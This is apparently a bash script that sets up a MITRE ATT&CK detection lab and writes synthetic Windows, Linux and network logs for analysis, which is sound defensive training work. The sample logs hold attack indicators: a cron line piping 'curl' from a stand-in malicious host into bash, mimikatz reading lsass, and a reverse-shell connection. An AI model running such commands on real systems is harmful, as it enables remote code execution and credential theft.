#!/bin/bash

# Create directory structure
mkdir -p ~/mitre-lab/{data,scripts,logs,reports}
cd ~/mitre-lab || exit

# Download MITRE ATT&CK dataset
echo "Downloading MITRE ATT&CK data..."
wget https://raw.githubusercontent.com/mitre/cti/master/enterprise-attack/enterprise-attack.json -O data/enterprise-attack.json

# Install required Python libraries
echo "Installing Python libraries..."
pip3 install requests pandas stix2 pyyaml

# Create Windows security log sample
cat > logs/windows_security.log << 'EOF'
2024-01-15 10:30:15 EventID:4688 Process:powershell.exe CommandLine:"powershell -enc SQBuAHYAbwBrAGUA"
2024-01-15 10:31:22 EventID:4697 Service:malicious_svc Path:C:\temp\backdoor.exe
2024-01-15 10:32:10 EventID:4663 Object:C:\Windows\System32\lsass.exe Access:Read Process:mimikatz.exe
2024-01-15 10:33:45 EventID:4648 Account:admin Target:DC01 Process:net.exe
2024-01-15 10:34:12 EventID:5156 Protocol:TCP Source:192.168.1.100 Dest:10.0.0.5 Port:445
EOF

# Create Linux auth log sample
cat > logs/linux_auth.log << 'EOF'
Jan 15 10:30:15 server sshd[1234]: Accepted password for root from 192.168.1.100
Jan 15 10:31:22 server sudo: admin : USER=root ; COMMAND=/bin/bash
Jan 15 10:32:10 server cron[9876]: (root) CMD (curl http://malicious.com/beacon | bash)
Jan 15 10:33:45 server systemd[1]: Started suspicious-service.service
EOF

# Create network log sample
cat > logs/network.log << 'EOF'
2024-01-15 10:30:15 TCP 192.168.1.100:1234 -> 10.0.0.5:445 SMB connection
2024-01-15 10:31:22 DNS Query: malicious-domain.com
2024-01-15 10:32:10 HTTP GET /payload.exe User-Agent: PowerShell
2024-01-15 10:33:45 TCP 192.168.1.100:4444 -> 203.0.113.1:443 Reverse shell
EOF

# Make scripts executable if they exist
chmod +x ~/mitre-lab/scripts/*.py 2>/dev/null

# Run parser
echo "Running MITRE parser..."
cd ~/mitre-lab/scripts || exit
python3 mitre_parser.py

# Run log analyzer
echo "Running log analyzer..."
python3 log_analyzer.py

# View results
echo "Viewing results..."
python3 view_results.py

# Run auto mapper
echo "Running auto mapper..."
python3 auto_mapper.py

echo "Lab setup and execution completed."
